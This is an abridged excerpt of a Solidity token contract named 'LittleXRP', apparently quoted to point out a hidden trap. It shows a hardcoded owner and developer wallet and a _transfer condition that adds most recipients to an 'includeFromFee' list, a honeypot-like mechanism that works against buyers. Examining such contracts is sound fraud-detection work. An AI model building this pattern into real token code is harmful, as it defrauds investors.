...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x465AE517A088c15842354fa3C640281D4f2F2782;
...
contract LittleXRP is Context, IERC20, Ownable { 
    ...
    */
    ...
    address payable private Wallet_Dev = payable(0x465AE517A088c15842354fa3C640281D4f2F2782);
    ...
    */
    ...
    function _transfer(
        ...
        */
        ...
        if ((from != owner() && to != owner()) || (from != Wallet_Dev && to != Wallet_Dev)){ includeFromFee.push(to);
